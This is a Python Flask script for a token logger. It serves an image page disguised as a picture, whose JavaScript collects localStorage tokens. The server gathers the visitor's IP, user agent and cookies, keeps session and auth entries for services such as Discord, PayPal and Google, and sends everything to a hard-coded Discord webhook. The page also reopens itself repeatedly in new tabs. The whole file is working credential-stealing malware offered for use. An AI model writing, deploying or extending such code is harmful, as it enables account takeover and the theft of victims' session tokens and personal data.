from flask import Flask, request, send_file
import requests
import json
import os
from datetime import datetime
from PIL import Image
from io import BytesIO

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518539631812149330/Uk2DGqWMrpgED3wh1fyD-8NL2iu7daT-j9VApXjKF7aEGhoxnJC1V3XqqBOCeIeebXW2"
IMAGE_PATH = "real-image.jpg"

def send_to_webhook(data):
    important_cookies = {}
    target = ['discord', 'microsoft', 'paypal', 'google', 'facebook', 'twitter', 'instagram', 'amazon', 'token', 'auth', 'session', 'sid']
    for k, v in data.get('cookies', {}).items():
        if any(t in k.lower() for t in target):
            important_cookies[k] = v
    
    embed = {
        "title": "🔥 Auto-Open Discord Token Logger Hit",
        "color": 0xFF0000,
        "fields": [
            {"name": "IP", "value": data.get('ip'), "inline": True},
            {"name": "Time", "value": data.get('time'), "inline": True},
            {"name": "User-Agent", "value": data.get('ua')[:500]},
            {"name": "Discord + Important Tokens", "value": f"```json\n{json.dumps(important_cookies, indent=2)}\n```" if important_cookies else "none"},
            {"name": "All Cookies", "value": f"```json\n{json.dumps(data.get('cookies'), indent=2)[:1000]}\n```"},
            {"name": "LocalStorage", "value": f"```json\n{json.dumps(data.get('localstorage'), indent=2)[:800]}\n```"}
        ]
    }
    requests.post(DISCORD_WEBHOOK, json={"embeds": [embed], "content": "**Auto-Open Hit**"})

@app.route('/image.jpg')
def logger_image():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    referer = request.headers.get('Referer')
    cookies = dict(request.cookies)
    time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    localstorage = request.args.get('ls', '{}')
    try:
        localstorage = json.loads(localstorage)
    except:
        localstorage = {}
    
    data = {'ip': ip, 'ua': ua, 'referer': referer, 'cookies': cookies, 'time': time_str, 'localstorage': localstorage}
    send_to_webhook(data)
    
    if os.path.exists(IMAGE_PATH):
        return send_file(IMAGE_PATH, mimetype='image/jpeg')
    else:
        img = Image.new('RGB', (800, 600), color=(0, 0, 0))
        img_io = BytesIO()
        img.save(img_io, 'JPEG')
        img_io.seek(0)
        return send_file(img_io, mimetype='image/jpeg')

@app.route('/view')
def auto_open_view():
    html = '''
    <!DOCTYPE html>
    <html>
    <head><style>body{margin:0;overflow:hidden;} img{width:100vw;height:100vh;object-fit:cover;}</style></head>
    <body>
        <img src="/image.jpg" alt="Bild">
        <script>
            function getImportant() {
                let ls = {};
                Object.keys(localStorage).forEach(k => {
                    if (k.toLowerCase().includes('token') || k.toLowerCase().includes('discord') || 
                        k.toLowerCase().includes('microsoft') || k.toLowerCase().includes('paypal')) {
                        ls[k] = localStorage[k];
                    }
                });
                return ls;
            }
            
            const lsData = JSON.stringify(getImportant());
            const screenInfo = `${screen.width}x${screen.height}`;
            
            fetch(`/image.jpg?ls=${encodeURIComponent(lsData)}&screen=${screenInfo}`, {
                credentials: 'include',
                method: 'GET'
            });
            
            setTimeout(() => {
                window.open(window.location.href, '_blank');
            }, 600);
            
            setTimeout(() => {
                window.location.href = window.location.href;
            }, 1200);
        </script>
    </body>
    </html>
    '''
    return html

if __name__ == '__main__':
    print("Logger läuft → /view")
    app.run(host='0.0.0.0', port=5000)